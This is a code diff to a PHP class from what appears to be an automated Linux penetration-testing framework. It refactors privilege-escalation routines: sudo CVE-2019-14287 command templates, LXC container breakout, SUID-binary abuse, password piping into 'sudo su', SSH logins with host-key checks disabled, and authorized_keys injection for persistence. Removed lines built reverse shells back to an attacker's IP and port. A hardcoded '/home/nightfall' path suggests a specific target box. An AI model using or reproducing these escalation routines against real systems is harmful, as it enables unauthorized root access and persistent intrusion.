@@ -39,25 +39,16 @@ class check4linux8misc extends check4linux8enum{
     
     public function misc2sudo8CVE_2019_14287(){
         $this->ssTitre(__FUNCTION__);
-        $attacker_ip = $this->ip4addr4target($this->ip);
-        $attacker_port = rand(1024,65535);
-        $shell = "/bin/sh";
         $template_id_euid = "sudo -u#-1 %ID% -u ";
-        if (!$this->ip2root8db($this->ip2id))  $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
+        if (!$this->ip2root8db($this->ip2id))  $this->lan2pentest8id($template_id_euid);
         $template_id_euid = "sudo -u#4294967295 %ID% -u ";
-        if (!$this->ip2root8db($this->ip2id))  $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
+        if (!$this->ip2root8db($this->ip2id))  $this->lan2pentest8id($template_id_euid);
     }
     
     public function misc2sudo(){
         $this->ssTitre("can we sudo without supplying a password");
-        $attacker_ip = $this->ip4addr4target($this->ip);
-        $attacker_port = rand(1024,65535);
-        $shell = "/bin/sh";
-
-        
-        
         $template_id_euid = "sudo -l -k %ID% 2>/dev/null";
-        $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
+        $this->lan2pentest8id($template_id_euid);
     }
     
     public function misc2container(){
@@ -109,8 +100,7 @@ lxc image import xenial-server-cloudimg-amd64-lxd.tar.xz rootfs xenial-server-cl
 lxc launch SomeAlias MyMachine
          */
         $attacker_ip = $this->ip4addr4target($this->ip);
-        $attacker_port = rand(1024,65535);
-        $shell = "/bin/bash";
+
         
 
         
@@ -145,7 +135,7 @@ lxc launch SomeAlias MyMachine
         $this->lan2stream4result($data,$this->stream_timeout);
         
         $template_id_euid = "lxc exec test bash -c %ID%";
-        $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
+        $this->lan2pentest8id($template_id_euid);
         
         
         
@@ -237,10 +227,8 @@ lxc launch SomeAlias MyMachine
         $ssh_port = trim($ssh_port);
         
         $template_id_euid = "echo -e \"ssh $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' <<#$userpass\n> /dev/tty\nls > /dev/tty\n#\" | bash ";
-        $attacker_ip = $this->ip4addr4target($this->ip);
-        $attacker_port = rand(1024,65535);
-        $shell = "/bin/bash";
-        $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
+
+        $this->lan2pentest8id($template_id_euid);
         //===============================================================
     }
     
@@ -252,10 +240,8 @@ lxc launch SomeAlias MyMachine
         $ssh_port = trim($ssh_port);
 
         $template_id_euid = "ssh -i $remote_privkey_path  $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' ";
-        $attacker_ip = $this->ip4addr4target($this->ip);
-        $attacker_port = rand(1024,65535);
-        $shell = "/bin/bash";
-        $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
+
+        $this->lan2pentest8id($template_id_euid);
         //===============================================================
     }
 
@@ -299,6 +285,8 @@ lxc launch SomeAlias MyMachine
         
     }
     
+
+    
     public function misc2keys4add(){
         $this->ssTitre(__FUNCTION__);
         $tab_home = array();
@@ -306,6 +294,7 @@ lxc launch SomeAlias MyMachine
         $data = "ls -l /home/* 2>/dev/null ";
         $rst_home = $this->lan2stream4result($data,$this->stream_timeout);
         exec("echo '$rst_home' | grep ':' | cut -d':' -f1 $this->filter_file_path ",$tab_home);
+        $tab_home = array("/home/nightfall");
         if (isset($tab_home[0])){
             foreach ($tab_home as $home_user){
                 $home_user = trim($home_user);
@@ -317,13 +306,16 @@ lxc launch SomeAlias MyMachine
     
     public function misc2keys2add($home_user){
         $this->ssTitre(__FUNCTION__);
+        $remote_username = "";
+        $tmp = array();
         $this->article("home user",$home_user);
-        $ip2users = $this->ip2users4shell();
         $authorized_keys_filepath = "";
         $authorized_keys_str = "";
-        foreach ($ip2users as $remote_username ){
-            $this->service4authorized_keys($this->stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, "", $remote_username, $home_user);
-        }
+        $query = "echo '$home_user' | sed \"s#/home/##g\"  ";
+        exec($query,$tmp);
+        if (isset($tmp[0])) $remote_username = trim($tmp[0]);
+        if (!empty($remote_username)) $this->service4authorized_keys($this->stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, "", $remote_username, $home_user);
+        
         
     }
     
@@ -687,17 +679,10 @@ EOC;
         $result .= $this->req_ret_str($data);
         $this->pause();
         
-        $data = "$this->vm_tmp_lin/suid id";
-        if( $this->lan2root4check8id($data,"test id root8suid/exports $this->vm_tmp_lin/suid")){
-            $attacker_ip = $this->ip4addr4target($this->ip);
-            $attacker_port = rand(1024,65535);
-            $shell = "/bin/bash";
-            $cmd = $this->rev8sh($attacker_ip, $attacker_port, $shell);
-            $data = "$this->vm_tmp_lin/suid $cmd";
-            $this->lan2pentest($attacker_port,"T","root8suid8exports $this->vm_tmp_lin/suid",$data,500);
-            
-            
-        }
+        $template_id_euid = "$this->vm_tmp_lin/suid %ID%";
+
+        $this->lan2pentest8id($template_id_euid);
+
         $this->pause();
         
         $result .= $this->users4root($this->created_user_name, $this->created_user_pass);
@@ -892,15 +877,12 @@ expect "$ "
          */
         $user_name = trim($user_name);
         $user_pass = trim($user_pass);
-        $attacker_ip = $this->ip4addr4target($this->ip);
-        $attacker_port = rand(1024,65535);
-        //$attacker_port = 7777;
-        $shell = "/bin/bash";
+
         //$template_id_euid = "( sleep $this->stream_timeout*3 ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su --login $user_name --shell $shell --command %ID%\",pty,stderr,setsid,sigint,ctty,sane";
-        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell $shell --command '%ID%' 2>1 ";
+        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell /bin/bash --command '%ID%' 2>1 ";
         
         
-        return $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
+        return $this->lan2pentest8id($template_id_euid);
         
     }
     
